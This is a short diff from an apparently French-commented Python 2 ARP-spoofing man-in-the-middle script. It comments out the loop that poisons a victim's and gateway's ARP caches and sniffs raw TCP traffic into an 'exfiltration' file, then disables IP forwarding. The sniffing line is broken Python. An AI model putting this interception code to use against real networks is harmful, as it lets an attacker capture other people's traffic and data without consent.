@@ -132,15 +132,15 @@ def mitm(): # fonction man in the middle
 	print "[*] Poisoning..."
 	
 	# a faire, mitm pour un temps donné.
-	while 1:
-		try:
-			trick(gateMAC, victimMAC)
-			time.sleep(1.5)
-			s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
-			print s.recvfrom(655565) >> '/exfiltration/capt_reseau.txt'
-		except KeyboardInterrupt:
-			reARP()
-			break
+	#while 1:
+	#	try:
+	#		trick(gateMAC, victimMAC)
+	#		time.sleep(1.5)
+	#		s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
+	#		print s.recvfrom(655565) >> '/exfiltration/capt_reseau.txt'
+	#	except KeyboardInterrupt:
+	#		reARP()
+	#		break
 	os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")		
 
 #TODO brute force -> meilleure gestion des exceptions ; multithreading
